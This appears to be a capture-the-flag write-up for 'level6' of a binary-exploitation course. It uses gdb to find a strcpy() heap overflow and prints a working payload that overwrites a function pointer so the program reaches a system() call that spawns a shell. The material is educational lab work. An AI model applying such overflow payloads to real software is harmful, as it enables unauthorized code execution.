# level6

We can see using gdb that there are three functions that could help us here,`main()` `m()` and `n()` : 

![image](https://github.com/chmadran/rainfall_42/assets/113340699/6533a40a-1076-4e76-835a-9075ca353e43)

Then we can see that main calls `m()` 

![image](https://github.com/chmadran/rainfall_42/assets/113340699/05f7fcc7-44e4-4394-88de-0c7ff80213c8)

but `m()` does nothing special but print something to stdout 

![image](https://github.com/chmadran/rainfall_42/assets/113340699/dcdc5c18-e8f9-43ac-8bbc-70ed16ba09f8)

Now `n()` is more interesting and we can see a call to `system()`, then we know through the decompiler that it opens a shell 

![image](https://github.com/chmadran/rainfall_42/assets/113340699/cda9d9b1-d496-4b67-88be-fd40d9d5a242)

so let's see what we can exploit to call `n()`, in `main()` there is a call to `strcpy()` where user input is not sanitized so we can exploit this to to a heap based overflow and execute `n()`

So let's find the offset with ```AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz```

![image](https://github.com/chmadran/rainfall_42/assets/113340699/684739d7-b93f-4fe3-a263-9d743ead6795)

`0x53` is 'S' which is the 19th letter of the alphabet, therefore if we do `(19*4) - 4 = 72` this is the offset as each letter is repeated 4 times but we need to account for the fact that we will be writing 4bytes with the address of the replaced function that is `n()` so we substract it in the end : 

`python -c 'print("A"*72 + "\x54\x84\x04\x08")'`

One last thing to note for this exercice is that we cannot pass the string in a file, therefore we need to execute it / expand it to pass it as a string to the binary 

`./level6 $(python -c 'print("A"*72 + "\x54\x84\x04\x08")')`




